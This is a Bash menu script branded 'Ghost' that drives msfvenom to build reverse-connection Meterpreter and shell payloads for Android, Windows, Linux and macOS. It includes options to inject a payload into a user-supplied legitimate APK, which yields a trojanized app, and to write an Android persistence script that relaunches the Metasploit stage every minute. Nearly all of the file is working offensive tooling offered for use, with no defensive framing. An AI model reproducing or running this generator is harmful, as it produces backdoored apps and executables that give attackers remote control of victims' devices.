#!/bin/bash

# Host discovery
lanip=$(ip addr | grep 'state UP' -A2 | tail -n1 | awk '{print $2}' | cut -f1 -d'/')
lanip6=$(ip addr | grep 'state UP' -A4 | tail -n1 | awk '{print $2}' | cut -f1 -d'/')
publicip=$(dig +short myip.opendns.com @resolver1.opendns.com)
hostn=$(host "$publicip" | awk '{print $5}' | sed 's/.$//')

# Android Payloads
androidhttps="android/meterpreter/reverse_https"
androidhttp="android/meterpreter/reverse_http"
androidtcp="android/meterpreter/reverse_tcp"
androidshellhttp="android/shell/reverse_http"
androidshelltcp="android/shell/reverse_tcp"

# Windows Payloads
windowstcp="windows/meterpreter/reverse_tcp"
windowshttp="windows/meterpreter/reverse_http"
windowstcpdns="windows/meterpreter/reverse_tcp_dns"
windowshttps="windows/meterpreter/reverse_https"
windowstcpuuid="windows/meterpreter/reverse_tcp_uuid"
windowswinhttp="windows/meterpreter/reverse_winhttp"
windowswinhttps="windows/meterpreter/reverse_winhttps"

# Linux Payloads
linuxtcp="linux/x86/meterpreter_reverse_tcp"
linuxhttps="linux/x86/meterpreter_reverse_https"
linuxhttp="linux/x86/meterpreter_reverse_http"
linuxtcpuuid="linux/x86/meterpreter/reverse_tcp_uuid"
linuxipv6tcp="linux/x86/meterpreter/reverse_ipv6_tcp"
linuxnonxtcp="linux/x86/meterpreter/reverse_nonx_tcp"

# MAC payload
mactcp="osx/x86/shell_reverse_tcp"

# Working directory
directory=$(pwd)

# Colors
Black='\033[1;30m'
Red='\033[1;31m'
Green='\033[1;32m'
Yellow='\033[1;33m'
Blue='\033[1;34m'
Purple='\033[1;35m'
Cyan='\033[1;36m'
White='\033[1;37m'
NC='\033[0m'
blue='\033[0;34m'
white='\033[0;37m'
lred='\033[0;31m'

# Check root
        if [ $(id -u) -ne 0 ]; then
        echo -e "${Blue} You must be root user to run the script"
	echo -e "${Blue} You must first run the Ghost script"
exit

fi

# MAC quest the payload
macquestpay () {
echo ""
echo -e "${White} Set lhost"
echo ""
echo -e "${White} IPV4 ${Blue}(${lanip})"
echo -e "${White} IPV6 ${Blue}(${lanip6})"
echo -e "${White} IP   ${Blue}(${publicip})"
echo ""
echo -ne "${White} Ghost > ${Yellow}"
read MAClhostu
echo ""
echo -e "${White} Set lport"
echo ""
echo -ne "${White} Ghost > ${Yellow}"
read MAClportu
echo ""
echo -e "${White} Name for the file"
echo ""
echo -ne "${White} Ghost > ${Yellow}"
read MACnameu
}

# Linux questions payload
linuxsetpayload () {
echo ""
echo -e "${White} Set lhost"
echo ""
echo -e "${White} IPV4 ${Blue}(${lanip})"
echo -e "${White} IPV6 ${Blue}(${lanip6})"
echo -e "${White} IP   ${Blue}(${publicip})"
echo ""
echo -ne "${White} Ghost > ${Yellow}"
read linuxlhostx
echo ""
echo -e "${White} Set lport"
echo ""
echo -ne "${White} Ghost > ${Yellow}"
read linuxlportx
echo ""
echo -e "${White} Name for the file"
echo ""
echo -ne "${White} Ghost > ${Yellow}"
read linuxnamex
}

# Windows questions payload
windowsquetssetpayload () {
echo ""
echo -e "${White} Set lhost"
echo ""
echo -e "${White} IPV4 ${Blue}(${lanip})"
echo -e "${White} IPV6 ${Blue}(${lanip6})"
echo -e "${White} IP   ${Blue}(${publicip})"
echo ""
echo -ne "${White} Ghost > ${Yellow}"
read windowslhostin
echo ""
echo -e "${White} Set lport"
echo ""
echo -ne "${White} Ghost > ${Yellow}"
read windowslporttin
echo ""
echo -e "${White} Name for the file"
echo ""
echo -ne "${White} Ghost > ${Yellow}"
read windowsnamein
}

# Android inject questions
androidquestinject () {
echo ""
echo -e "${White} Enter the path to your android app ${Yellow}(ex: /root/downloads/myapp.apk)"
echo ""
echo -ne "${White} Ghost > ${Yellow}"
read pathin
echo ""
echo -e "${White} Set lhost"
echo ""
echo -e "${White} IPV4 ${Blue}(${lanip})"
echo -e "${White} IPV6 ${Blue}(${lanip6})"
echo -e "${White} IP   ${Blue}(${publicip})"
echo ""
echo -ne "${White} Ghost > ${Yellow}"
read lhostin
echo ""
echo -e "${White} Set lport"
echo ""
echo -ne "${White} Ghost > ${Yellow}"
read lportin
echo ""
echo -e "${White} Name for the apk file"
echo ""
echo -ne "${White} Ghost > ${Yellow}"
read namein
}

# Android apkmsf questions
androidmsfquest () {
echo ""
echo -e "${White} Set lhost"
echo ""
echo -e "${White} IPV4 ${Blue}(${lanip})"
echo -e "${White} IPV6 ${Blue}(${lanip6})"
echo -e "${White} IP   ${Blue}(${publicip})"
echo ""
echo -ne "${White} Ghost > ${Yellow}"
read lhostin
echo ""
echo -e "${White} Set lport"
echo ""
echo -ne "${White} Ghost > ${Yellow}"
read lportin
echo ""
echo -e "${White} Name for the apk file"
echo ""
echo -ne "${White} Ghost > ${Yellow}"
read namein
}

# Presentation of the script
banner () {
echo -e "${Blue}       ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗                                        "
echo -e "${Blue}      ██╔════╝ ██║  ██║██╔═══██╗██╔════╝╚══██╔══╝                                        "
echo -e "${Blue}      ██║  ███╗███████║██║   ██║███████╗   ██║         ${White}By ${Blue}AlvinPix        "
echo -e "${Blue}      ██║   ██║██╔══██║██║   ██║╚════██║   ██║                                           "
echo -e "${Blue}  The ╚██████╔╝██║  ██║╚██████╔╝███████║   ██║   Msfvenom                                "
echo -e "${Blue}       ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝                                           "
}

# The main menu
ghostmsfvenom () {
clear
echo ""
banner
echo ""
echo -e "${White} [${Yellow}0${White}] Return to main menu"
echo -e "${White} [${Yellow}r${White}] Remove all payloads"
echo -e "${White} [${Yellow}l${White}] View payloads folder"
echo ""
echo -e "${White} [${Yellow}1${White}] Android Injection apk"
echo -e "${White} [${Yellow}2${White}] Android msfvenom apk"
echo -e "${White} [${Yellow}3${White}] Android persistence file"
echo ""
echo -e "${White} [${Yellow}4${White}] Windows"
echo -e "${White} [${Yellow}5${White}] Linux"
echo -e "${White} [${Yellow}6${White}] Mac"
echo ""
echo -ne "${White} Ghost > ${Yellow}"
read ghostopt

case $ghostopt in

0)
cd $directory
./Ghost.sh
;;

r)
echo -e "${White} Removing payloads from the ${Blue}(Generated) ${White}folder"
cd $directory/Generated
rm -rf *
echo ""
echo -ne "${White} Press any key to continue..."
read
ghostmsfvenom ;;

l)
cd $directory/Generated
echo ""
lsd -A -l
echo ""
echo -ne "${White} Press any key to continue..."
read
ghostmsfvenom ;;

1)
androidinject ;;

2)
androidmsf ;;

3)
echo ""
echo -e "${White} Write the name of the apk file to create the persistence file"
echo ""
cd $directory/Generated
lsd -A -l
echo ""
echo -ne "${White} Ghost > ${Yellow}"
read namepersist
touch "$namepersist.sh"
echo "#!/system/bin/sh" >> "$namepersist.sh"
echo while : >> "$namepersist.sh"
echo do am start --user 0 -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity >> "$namepersist.sh"
echo sleep 60 >> "$namepersist.sh"
echo done >> "$namepersist.sh"
echo -e "${White} Persistence file created ${Blue}(${namepersist}.sh)"
echo ""
echo -ne "${White} Press any key to continue..."
read
ghostmsfvenom ;;

4)
windows ;;

5)
linux ;;

6)
mac ;;

* )
echo -e "${Blue} The option is not valid please choose a number or letters"
sleep 1
ghostmsfvenom ;;
esac
}

# Android msfvenom apk
androidmsf () {
echo ""
echo -e "${White} Choose your ${Blue}(android) ${White}payload"
echo ""
echo -e "${White} [${Yellow}1${White}] ${androidhttps}"
echo -e "${White} [${Yellow}2${White}] ${androidhttp}"
echo -e "${White} [${Yellow}3${White}] ${androidtcp}"
echo -e "${White} [${Yellow}4${White}] ${androidshellhttp}"
echo -e "${White} [${Yellow}5${White}] ${androidshelltcp}"
echo ""
echo -e "${White} [${Yellow}6${White}] Return to main menu"
echo ""
echo -ne "${White} Ghost > ${Yellow}"
read paymsfin

case $paymsfin in

1)
androidmsfquest
echo ""
echo -e "${White} DATA     INPUT"
echo ""
echo -e "${White} LHOST    ${Blue}(${lhostin})"
echo -e "${White} LPORT    ${Blue}(${lportin})"
echo -e "${White} NAME     ${Blue}(${namein}.apk)"
echo -e "${White} PAYLOAD  ${Blue}(${androidhttps})"
echo ""
echo -e "${White} Generating payload ${Blue}(${namein}.apk)${White}..."
msfvenom -p $androidhttps lhost=$lhostin lport=$lportin -f raw -o $directory/Generated/$namein.apk 2>/dev/null
echo ""
echo -e "${White} Ready payload saved in ${Yellow}($directory/Generated/$namein.apk)"
echo ""
echo -ne "${White} Press any key to continue..."
read
ghostmsfvenom ;;

2)
androidmsfquest
echo ""
echo -e "${White} DATA     INPUT"
echo ""
echo -e "${White} LHOST    ${Blue}(${lhostin})"
echo -e "${White} LPORT    ${Blue}(${lportin})"
echo -e "${White} NAME     ${Blue}(${namein}.apk)"
echo -e "${White} PAYLOAD  ${Blue}(${androidhttp})"
echo ""
echo -e "${White} Generating payload ${Blue}(${namein}.apk)${White}..."
msfvenom -p $androidhttp lhost=$lhostin lport=$lportin -f raw -o $directory/Generated/$namein.apk 2>/dev/null
echo ""
echo -e "${White} Ready payload saved in ${Yellow}($directory/Generated/$namein.apk)"
echo ""
echo -ne "${White} Press any key to continue..."
read
ghostmsfvenom ;;

3)
androidmsfquest
echo ""
echo -e "${White} DATA     INPUT"
echo ""
echo -e "${White} LHOST    ${Blue}(${lhostin})"
echo -e "${White} LPORT    ${Blue}(${lportin})"
echo -e "${White} NAME     ${Blue}(${namein}.apk)"
echo -e "${White} PAYLOAD  ${Blue}(${androidtcp})"
echo ""
echo -e "${White} Generating payload ${Blue}(${namein}.apk)${White}..."
msfvenom -p $androidtcp lhost=$lhostin lport=$lportin -f raw -o $directory/Generated/$namein.apk 2>/dev/null
echo ""
echo -e "${White} Ready payload saved in ${Yellow}($directory/Generated/$namein.apk)"
echo ""
echo -ne "${White} Press any key to continue..."
read
ghostmsfvenom ;;

4)
androidmsfquest
echo ""
echo -e "${White} DATA     INPUT"
echo ""
echo -e "${White} LHOST    ${Blue}(${lhostin})"
echo -e "${White} LPORT    ${Blue}(${lportin})"
echo -e "${White} NAME     ${Blue}(${namein}.apk)"
echo -e "${White} PAYLOAD  ${Blue}(${androidshellhttp})"
echo ""
echo -e "${White} Generating payload ${Blue}(${namein}.apk)${White}..."
msfvenom -p $androidshellhttp lhost=$lhostin lport=$lportin -f raw -o $directory/Generated/$namein.apk 2>/dev/null
echo ""
echo -e "${White} Ready payload saved in ${Yellow}($directory/Generated/$namein.apk)"
echo ""
echo -ne "${White} Press any key to continue..."
read
ghostmsfvenom ;;

5)
androidmsfquest
echo ""
echo -e "${White} DATA     INPUT"
echo ""
echo -e "${White} LHOST    ${Blue}(${lhostin})"
echo -e "${White} LPORT    ${Blue}(${lportin})"
echo -e "${White} NAME     ${Blue}(${namein}.apk)"
echo -e "${White} PAYLOAD  ${Blue}(${androidshelltcp})"
echo ""
echo -e "${White} Generating payload ${Blue}(${namein}.apk)${White}..."
msfvenom -p $androidshelltcp lhost=$lhostin lport=$lportin -f raw -o $directory/Generated/$namein.apk 2>/dev/null
echo ""
echo -e "${White} Ready payload saved in ${Yellow}($directory/Generated/$namein.apk)"
echo ""
echo -ne "${White} Press any key to continue..."
read
ghostmsfvenom ;;

6)
ghostmsfvenom ;;

* )
echo -e "${Blue} The option is not valid please choose a number"
sleep 1
ghostmsfvenom ;;
esac
}




# Android inject apk payload
androidinject () {
echo ""
echo -e "${White} Choose your ${Blue}(android) ${White}payload"
echo ""
echo -e "${White} [${Yellow}1${White}] ${androidhttps}"
echo -e "${White} [${Yellow}2${White}] ${androidhttp}"
echo -e "${White} [${Yellow}3${White}] ${androidtcp}"
echo -e "${White} [${Yellow}4${White}] ${androidshellhttp}"
echo -e "${White} [${Yellow}5${White}] ${androidshelltcp}"
echo ""
echo -e "${White} [${Yellow}6${White}] Return to main menu"
echo ""
echo -ne "${White} Ghost > ${Yellow}"
read payloadinch

case $payloadinch in

1)
androidquestinject
echo ""
echo -e "${White} DATA     INPUT"
echo ""
echo -e "${White} LHOST    ${Blue}(${lhostin})"
echo -e "${White} LPORT    ${Blue}(${lportin})"
echo -e "${White} NAME     ${Blue}(${namein}.apk)"
echo -e "${White} PAYLOAD  ${Blue}(${androidhttps})"
echo ""
echo -e "${White} Generating payload ${Blue}(${namein}.apk)${White}..."
msfvenom -p $androidhttps -x $pathin lhost=$lhostin lport=$lportin -f raw -o $directory/Generated/$namein.apk 2>/dev/null
echo ""
echo -e "${White} Ready payload saved in ${Yellow}($directory/Generated/$namein.apk)"
echo ""
echo -ne "${White} Press any key to continue..."
read
ghostmsfvenom ;;

2)
androidquestinject
echo ""
echo -e "${White} DATA     INPUT"
echo ""
echo -e "${White} LHOST    ${Blue}(${lhostin})"
echo -e "${White} LPORT    ${Blue}(${lportin})"
echo -e "${White} NAME     ${Blue}(${namein}.apk)"
echo -e "${White} PAYLOAD  ${Blue}(${androidhttp})"
echo ""
echo -e "${White} Generating payload ${Blue}(${namein}.apk)${White}..."
msfvenom -p $androidhttp -x $pathin lhost=$lhostin lport=$lportin -f raw -o $directory/Generated/$namein.apk 2>/dev/null
echo ""
echo -e "${White} Ready payload saved in ${Yellow}($directory/Generated/$namein.apk)"
echo ""
echo -ne "${White} Press any key to continue..."
read
ghostmsfvenom ;;

3)
androidquestinject
echo ""
echo -e "${White} DATA     INPUT"
echo ""
echo -e "${White} LHOST    ${Blue}(${lhostin})"
echo -e "${White} LPORT    ${Blue}(${lportin})"
echo -e "${White} NAME     ${Blue}(${namein}.apk)"
echo -e "${White} PAYLOAD  ${Blue}(${androidtcp})"
echo ""
echo -e "${White} Generating payload ${Blue}(${namein}.apk)${White}..."
msfvenom -p $androidtcp -x $pathin lhost=$lhostin lport=$lportin -f raw -o $directory/Generated/$namein.apk 2>/dev/null
echo ""
echo -e "${White} Ready payload saved in ${Yellow}($directory/Generated/$namein.apk)"
echo ""
echo -ne "${White} Press any key to continue..."
read
ghostmsfvenom ;;

4)
androidquestinject
echo ""
echo -e "${White} DATA     INPUT"
echo ""
echo -e "${White} LHOST    ${Blue}(${lhostin})"
echo -e "${White} LPORT    ${Blue}(${lportin})"
echo -e "${White} NAME     ${Blue}(${namein}.apk)"
echo -e "${White} PAYLOAD  ${Blue}(${androidshellhttp})"
echo ""
echo -e "${White} Generating payload ${Blue}(${namein}.apk)${White}..."
msfvenom -p $androidshellhttp -x $pathin lhost=$lhostin lport=$lportin -f raw -o $directory/Generated/$namein.apk 2>/dev/null
echo ""
echo -e "${White} Ready payload saved in ${Yellow}($directory/Generated/$namein.apk)"
echo ""
echo -ne "${White} Press any key to continue..."
read
ghostmsfvenom ;;

5)
androidquestinject
echo ""
echo -e "${White} DATA     INPUT"
echo ""
echo -e "${White} LHOST    ${Blue}(${lhostin})"
echo -e "${White} LPORT    ${Blue}(${lportin})"
echo -e "${White} NAME     ${Blue}(${namein}.apk)"
echo -e "${White} PAYLOAD  ${Blue}(${androidshelltcp})"
echo ""
echo -e "${White} Generating payload ${Blue}(${namein}.apk)${White}..."
msfvenom -p $androidshelltcp -x $pathin lhost=$lhostin lport=$lportin -f raw -o $directory/Generated/$namein.apk 2>/dev/null
echo ""
echo -e "${White} Ready payload saved in ${Yellow}($directory/Generated/$namein.apk)"
echo ""
echo -ne "${White} Press any key to continue..."
read
ghostmsfvenom ;;

6)
ghostmsfvenom ;;

* )
echo -e "${Blue} The option is not valid please choose a number"
sleep 1
ghostmsfvenom ;;
esac
}



# Windows payload generator
windows () {
echo ""
echo -e "${White} Choose your ${Blue}(windows) ${White}payload"
echo ""
echo -e "${White} [${Yellow}1${White}] ${windowstcp}"
echo -e "${White} [${Yellow}2${White}] ${windowshttp}"
echo -e "${White} [${Yellow}3${White}] ${windowstcpdns}"
echo -e "${White} [${Yellow}4${White}] ${windowshttps}"
echo -e "${White} [${Yellow}5${White}] ${windowstcpuuid}"
echo -e "${White} [${Yellow}6${White}] ${windowswinhttp}"
echo -e "${White} [${Yellow}7${White}] ${windowswinhttps}"
echo ""
echo -e "${White} [${Yellow}8${White}] Return to main menu"
echo ""
echo -ne "${White} Ghost > ${Yellow}"
read winspeyload

case $winspeyload in

1)
windowsquetssetpayload
echo ""
echo -e "${White} DATA     INPUT"
echo ""
echo -e "${White} LHOST    ${Blue}(${windowslhostin})"
echo -e "${White} LPORT    ${Blue}(${windowslporttin})"
echo -e "${White} NAME     ${Blue}(${windowsnamein}.exe)"
echo -e "${White} PAYLOAD  ${Blue}(${windowstcp})"
echo ""
echo -e "${White} Generating payload ${Blue}(${windowsnamein}.exe)${White}..."
msfvenom -p $windowstcp lhost=$windowslhostin lport=$windowslporttin -f exe -o $directory/Generated/$windowsnamein.exe 2>/dev/null
echo ""
echo -e "${White} Ready payload saved in ${Yellow}($directory/Generated/$windowsnamein.exe)"
echo ""
echo -ne "${White} Press any key to continue..."
read
ghostmsfvenom ;;

2)
windowsquetssetpayload
echo ""
echo -e "${White} DATA     INPUT"
echo ""
echo -e "${White} LHOST    ${Blue}(${windowslhostin})"
echo -e "${White} LPORT    ${Blue}(${windowslporttin})"
echo -e "${White} NAME     ${Blue}(${windowsnamein}.exe)"
echo -e "${White} PAYLOAD  ${Blue}(${windowshttp})"
echo ""
echo -e "${White} Generating payload ${Blue}(${windowsnamein}.exe)${White}..."
msfvenom -p $windowshttp lhost=$windowslhostin lport=$windowslporttin -f exe -o $directory/Generated/$windowsnamein.exe 2>/dev/null
echo ""
echo -e "${White} Ready payload saved in ${Yellow}($directory/Generated/$windowsnamein.exe)"
echo ""
echo -ne "${White} Press any key to continue..."
read
ghostmsfvenom ;;

3)
windowsquetssetpayload
echo ""
echo -e "${White} DATA     INPUT"
echo ""
echo -e "${White} LHOST    ${Blue}(${windowslhostin})"
echo -e "${White} LPORT    ${Blue}(${windowslporttin})"
echo -e "${White} NAME     ${Blue}(${windowsnamein}.exe)"
echo -e "${White} PAYLOAD  ${Blue}(${windowstcpdns})"
echo ""
echo -e "${White} Generating payload ${Blue}(${windowsnamein}.exe)${White}..."
msfvenom -p $windowstcpdns lhost=$windowslhostin lport=$windowslporttin -f exe -o $directory/Generated/$windowsnamein.exe 2>/dev/null
echo ""
echo -e "${White} Ready payload saved in ${Yellow}($directory/Generated/$windowsnamein.exe)"
echo ""
echo -ne "${White} Press any key to continue..."
read
ghostmsfvenom ;;

4)
windowsquetssetpayload
echo ""
echo -e "${White} DATA     INPUT"
echo ""
echo -e "${White} LHOST    ${Blue}(${windowslhostin})"
echo -e "${White} LPORT    ${Blue}(${windowslporttin})"
echo -e "${White} NAME     ${Blue}(${windowsnamein}.exe)"
echo -e "${White} PAYLOAD  ${Blue}(${windowshttps})"
echo ""
echo -e "${White} Generating payload ${Blue}(${windowsnamein}.exe)${White}..."
msfvenom -p $windowshttps lhost=$windowslhostin lport=$windowslporttin -f exe -o $directory/Generated/$windowsnamein.exe 2>/dev/null
echo ""
echo -e "${White} Ready payload saved in ${Yellow}($directory/Generated/$windowsnamein.exe)"
echo ""
echo -ne "${White} Press any key to continue..."
read
ghostmsfvenom ;;

5)
windowsquetssetpayload
echo ""
echo -e "${White} DATA     INPUT"
echo ""
echo -e "${White} LHOST    ${Blue}(${windowslhostin})"
echo -e "${White} LPORT    ${Blue}(${windowslporttin})"
echo -e "${White} NAME     ${Blue}(${windowsnamein}.exe)"
echo -e "${White} PAYLOAD  ${Blue}(${windowstcpuuid})"
echo ""
echo -e "${White} Generating payload ${Blue}(${windowsnamein}.exe)${White}..."
msfvenom -p $windowstcpuuid lhost=$windowslhostin lport=$windowslporttin -f exe -o $directory/Generated/$windowsnamein.exe 2>/dev/null
echo ""
echo -e "${White} Ready payload saved in ${Yellow}($directory/Generated/$windowsnamein.exe)"
echo ""
echo -ne "${White} Press any key to continue..."
read
ghostmsfvenom ;;

6)
windowsquetssetpayload
echo ""
echo -e "${White} DATA     INPUT"
echo ""
echo -e "${White} LHOST    ${Blue}(${windowslhostin})"
echo -e "${White} LPORT    ${Blue}(${windowslporttin})"
echo -e "${White} NAME     ${Blue}(${windowsnamein}.exe)"
echo -e "${White} PAYLOAD  ${Blue}(${windowswinhttp})"
echo ""
echo -e "${White} Generating payload ${Blue}(${windowsnamein}.exe)${White}..."
msfvenom -p $windowswinhttp lhost=$windowslhostin lport=$windowslporttin -f exe -o $directory/Generated/$windowsnamein.exe 2>/dev/null
echo ""
echo -e "${White} Ready payload saved in ${Yellow}($directory/Generated/$windowsnamein.exe)"
echo ""
echo -ne "${White} Press any key to continue..."
read
ghostmsfvenom ;;

7)
windowsquetssetpayload
echo ""
echo -e "${White} DATA     INPUT"
echo ""
echo -e "${White} LHOST    ${Blue}(${windowslhostin})"
echo -e "${White} LPORT    ${Blue}(${windowslporttin})"
echo -e "${White} NAME     ${Blue}(${windowsnamein}.exe)"
echo -e "${White} PAYLOAD  ${Blue}(${windowswinhttps})"
echo ""
echo -e "${White} Generating payload ${Blue}(${windowsnamein}.exe)${White}..."
msfvenom -p $windowswinhttps lhost=$windowslhostin lport=$windowslporttin -f exe -o $directory/Generated/$windowsnamein.exe 2>/dev/null
echo ""
echo -e "${White} Ready payload saved in ${Yellow}($directory/Generated/$windowsnamein.exe)"
echo ""
echo -ne "${White} Press any key to continue..."
read
ghostmsfvenom ;;

8)
ghostmsfvenom ;;


* )
echo -e "${Blue} The option is not valid please choose a number"
sleep 1
ghostmsfvenom ;;
esac
}





# Linux payload generator
linux () {
echo ""
echo -e "${White} Choose your ${Blue}(linux) ${White}payload"
echo ""
echo -e "${White} [${Yellow}1${White}] ${linuxtcp}"
echo -e "${White} [${Yellow}2${White}] ${linuxhttps}"
echo -e "${White} [${Yellow}3${White}] ${linuxhttp}"
echo -e "${White} [${Yellow}4${White}] ${linuxtcpuuid}"
echo -e "${White} [${Yellow}5${White}] ${linuxipv6tcp}"
echo -e "${White} [${Yellow}6${White}] ${linuxnonxtcp}"
echo ""
echo -e "${White} [${Yellow}7${White}] Return to main menu"
echo ""
echo -ne "${White} Ghost > ${Yellow}"
read linuxchoosepay

case $linuxchoosepay in

1)
linuxsetpayload
echo ""
echo -e "${White} DATA     INPUT"
echo ""
echo -e "${White} LHOST    ${Blue}(${linuxlhostx})"
echo -e "${White} LPORT    ${Blue}(${linuxlportx})"
echo -e "${White} NAME     ${Blue}(${linuxnamex}.elf)"
echo -e "${White} PAYLOAD  ${Blue}(${linuxtcp})"
echo ""
echo -e "${White} Generating payload ${Blue}(${linuxnamex}.elf)${White}..."
msfvenom -p $linuxtcp lhost=$linuxlhostx lport=$linuxlportx -f elf> $directory/Generated/$linuxnamex.elf 2>/dev/null
echo ""
echo -e "${White} Ready payload saved in ${Yellow}($directory/Generated/$linuxnamex.elf)"
echo ""
echo -ne "${White} Press any key to continue..."
read
ghostmsfvenom ;;

2)
linuxsetpayload
echo ""
echo -e "${White} DATA     INPUT"
echo ""
echo -e "${White} LHOST    ${Blue}(${linuxlhostx})"
echo -e "${White} LPORT    ${Blue}(${linuxlportx})"
echo -e "${White} NAME     ${Blue}(${linuxnamex}.elf)"
echo -e "${White} PAYLOAD  ${Blue}(${linuxhttps})"
echo ""
echo -e "${White} Generating payload ${Blue}(${linuxnamex}.elf)${White}..."
msfvenom -p $linuxhttps lhost=$linuxlhostx lport=$linuxlportx -f elf> $directory/Generated/$linuxnamex.elf 2>/dev/null
echo ""
echo -e "${White} Ready payload saved in ${Yellow}($directory/Generated/$linuxnamex.elf)"
echo ""
echo -ne "${White} Press any key to continue..."
read
ghostmsfvenom ;;

3)
linuxsetpayload
echo ""
echo -e "${White} DATA     INPUT"
echo ""
echo -e "${White} LHOST    ${Blue}(${linuxlhostx})"
echo -e "${White} LPORT    ${Blue}(${linuxlportx})"
echo -e "${White} NAME     ${Blue}(${linuxnamex}.elf)"
echo -e "${White} PAYLOAD  ${Blue}(${linuxhttp})"
echo ""
echo -e "${White} Generating payload ${Blue}(${linuxnamex}.elf)${White}..."
msfvenom -p $linuxhttp lhost=$linuxlhostx lport=$linuxlportx -f elf> $directory/Generated/$linuxnamex.elf 2>/dev/null
echo ""
echo -e "${White} Ready payload saved in ${Yellow}($directory/Generated/$linuxnamex.elf)"
echo ""
echo -ne "${White} Press any key to continue..."
read
ghostmsfvenom ;;

4)
linuxsetpayload
echo ""
echo -e "${White} DATA     INPUT"
echo ""
echo -e "${White} LHOST    ${Blue}(${linuxlhostx})"
echo -e "${White} LPORT    ${Blue}(${linuxlportx})"
echo -e "${White} NAME     ${Blue}(${linuxnamex}.elf)"
echo -e "${White} PAYLOAD  ${Blue}(${linuxtcpuuid})"
echo ""
echo -e "${White} Generating payload ${Blue}(${linuxnamex}.elf)${White}..."
msfvenom -p $linuxtcpuuid lhost=$linuxlhostx lport=$linuxlportx -f elf> $directory/Generated/$linuxnamex.elf 2>/dev/null
echo ""
echo -e "${White} Ready payload saved in ${Yellow}($directory/Generated/$linuxnamex.elf)"
echo ""
echo -ne "${White} Press any key to continue..."
read
ghostmsfvenom ;;

5)
linuxsetpayload
echo ""
echo -e "${White} DATA     INPUT"
echo ""
echo -e "${White} LHOST    ${Blue}(${linuxlhostx})"
echo -e "${White} LPORT    ${Blue}(${linuxlportx})"
echo -e "${White} NAME     ${Blue}(${linuxnamex}.elf)"
echo -e "${White} PAYLOAD  ${Blue}(${linuxipv6tcp})"
echo ""
echo -e "${White} Generating payload ${Blue}(${linuxnamex}.elf)${White}..."
msfvenom -p $linuxipv6tcp lhost=$linuxlhostx lport=$linuxlportx -f elf> $directory/Generated/$linuxnamex.elf 2>/dev/null
echo ""
echo -e "${White} Ready payload saved in ${Yellow}($directory/Generated/$linuxnamex.elf)"
echo ""
echo -ne "${White} Press any key to continue..."
read
ghostmsfvenom ;;

6)
linuxsetpayload
echo ""
echo -e "${White} DATA     INPUT"
echo ""
echo -e "${White} LHOST    ${Blue}(${linuxlhostx})"
echo -e "${White} LPORT    ${Blue}(${linuxlportx})"
echo -e "${White} NAME     ${Blue}(${linuxnamex}.elf)"
echo -e "${White} PAYLOAD  ${Blue}(${linuxnonxtcp})"
echo ""
echo -e "${White} Generating payload ${Blue}(${linuxnamex}.elf)${White}..."
msfvenom -p $linuxnonxtcp lhost=$linuxlhostx lport=$linuxlportx -f elf> $directory/Generated/$linuxnamex.elf 2>/dev/null
echo ""
echo -e "${White} Ready payload saved in ${Yellow}($directory/Generated/$linuxnamex.elf)"
echo ""
echo -ne "${White} Press any key to continue..."
read
ghostmsfvenom ;;

7)
ghostmsfvenom ;;

* )
echo -e "${Blue} The option is not valid please choose a number"
sleep 1
ghostmsfvenom ;;
esac
}


mac () {
macquestpay
echo ""
echo -e "${White} DATA     INPUT"
echo ""
echo -e "${White} LHOST    ${Blue}(${MAClhostu})"
echo -e "${White} LPORT    ${Blue}(${MAClportu})"
echo -e "${White} NAME     ${Blue}(${MACnameu}.macho)"
echo -e "${White} PAYLOAD  ${Blue}(${mactcp})"
echo ""
echo -e "${White} Generating payload ${Blue}(${MACnameu}.macho)${White}..."
msfvenom -p $mactcp lhost=$MAClhostu lport=$MAClportu -f macho -o $directory/Generated/$MACnameu.macho 2>/dev/null
echo ""
echo -e "${White} Ready payload saved in ${Yellow}($directory/Generated/$MACnameu.macho)"
echo ""
echo -ne "${White} Press any key to continue..."
read
ghostmsfvenom
}

# Call menus the script Ghost :)
reset
ghostmsfvenom
